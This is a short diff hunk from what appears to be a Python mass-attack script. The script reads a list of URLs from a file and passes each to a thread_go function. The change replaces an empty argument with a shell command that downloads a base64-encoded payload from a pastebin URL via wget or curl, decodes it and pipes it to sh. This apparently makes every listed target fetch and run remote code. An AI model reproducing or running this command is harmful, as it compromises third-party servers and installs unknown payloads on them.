@@ -35,6 +35,6 @@ if __name__ == '__main__':
     with open('3396.txt','r') as f:
         urls = f.read().splitlines()
         for url in urls:
-            thread_go(url.strip(),"")
+            thread_go(url.strip(),"((wget -q -O- https://pastebin.com/raw/8BsGPueZ || curl -fsSL https://pastebin.com/raw/8BsGPueZ) | base64 -d) | sh")
 
 
